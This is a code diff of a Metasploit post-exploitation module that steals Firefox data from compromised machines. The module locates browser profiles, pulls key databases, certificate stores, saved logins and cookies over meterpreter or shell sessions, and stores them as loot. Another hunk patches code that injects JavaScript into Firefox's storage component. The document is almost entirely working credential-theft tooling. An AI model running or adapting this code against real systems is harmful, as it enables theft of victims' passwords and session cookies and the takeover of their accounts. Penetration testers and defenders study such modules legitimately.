@@ -338,35 +338,24 @@ class Metasploit3 < Msf::Post
       #   win: C:\Users\administrator\AppData\Roaming\Mozilla\Firefox\Profiles\tsnwjx4g.default
       # linux: /root/.mozilla/firefox/tsnwjx4g.default         (iceweasel)
       #   osx: /Users/mbp/Library/Application Support/Firefox/Profiles/tsnwjx4g.default
-      profile = path.scan(/Profiles[\\|\/](.+)$/).flatten[0].to_s
-      profile = path.scan(/firefox[\\|\/](.+)$/).flatten[0].to_s if profile.empty?
+      profile = path.scan(/Profiles[\\|\/](.+)\.(.+)$/).flatten[0].to_s
+      profile = path.scan(/firefox[\\|\/](.+)\.(.+)$/).flatten[0].to_s if profile.empty?
 
       session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = session.shell_command("ls #{path} 2>/dev/null").split())
 
       files.each do |file|
-      file.chomp!
+        file.chomp!
         if file =~ /^key\d\.db$/ or file =~ /^cert\d\.db$/ or file =~ /^signons.sqlite$/i or file =~ /^cookies\.sqlite$/ or file =~ /^logins\.json$/
-          vprint_status("Downloading: #{file}")
-          if session.type == "meterpreter"
-            file = path + "\\" + file
-            fd = session.fs.file.new(file)
-            begin
-              until fd.eof?
-                data = fd.read
-                loot << data if !data.nil?
-              end
-            rescue EOFError
-            ensure
-              fd.close
-            end
-          else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
-            loot = session.shell_command("cat #{path + file}")
-          end
-
           ext = file.split('.')[2]
           ext == "txt" ? (mime = "plain") : (mime = "binary")
-          file = file.split('\\').last
-          p = store_loot("ff.profile.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
+          vprint_status("Downloading: #{file}")
+          if session.type == "meterpreter"
+            p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, "firefox_#{file}")
+            session.fs.file.download_file(p, path + "\\" + file)
+          else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
+            loot = session.shell_command("cat #{path + file}")
+            p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
+          end
           print_good("Downloaded #{file}: #{p.to_s}")
         end
       end
@@ -526,7 +515,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     stor_js['content'].each_line do |line|
       # There is no real substitution if the matching regex has no corresponding patch code
       if i != 0 and line.sub!(regex[i][0]) do |match|
-          if not regex[i][1].nil?
+          if !regex[i][1].nil?
             vprint_good("[#{x-i+1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
             regex[i][1]
           end
